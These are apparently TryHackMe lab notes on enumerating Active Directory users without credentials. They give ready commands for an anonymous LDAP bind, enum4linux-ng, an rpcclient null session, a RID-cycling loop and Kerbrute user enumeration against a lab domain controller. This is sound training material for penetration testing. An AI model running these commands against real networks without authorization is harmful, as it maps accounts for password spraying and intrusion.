# Phase 3: User Enumeration
 
 

## Objective
Discover valid domain user accounts without credentials.

## Method 1: LDAP Enumeration
```bash
# Test anonymous bind
ldapsearch -x -H ldap://10.211.11.10 -s base

# Query all users
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"
```

## Method 2: Enum4linux-ng
```bash
enum4linux-ng -A 10.211.11.10 -oA results.txt
```

### Flags
- -A : All enumeration functions
- -U : Users only
- -G : Groups only
- -S : Shares only
- -P : Password policy
- -oA : Save output to file

## Method 3: RPC Null Session
```bash
rpcclient -U "" 10.211.11.10 -N
```
### Inside rpcclient shell:
```bash
enumdomusers    # List all users
enumdomgroups   # List all groups
getdompwinfo    # Get password policy
```

## Method 4: RID Cycling
```bash
for i in $(seq 500 2000); do echo "queryuser $i" | rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
```

## Method 5: Kerbrute
```bash
# Download and setup
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
mv kerbrute_linux_amd64 kerbrute
chmod +x kerbrute

# Enumerate valid users
./kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt
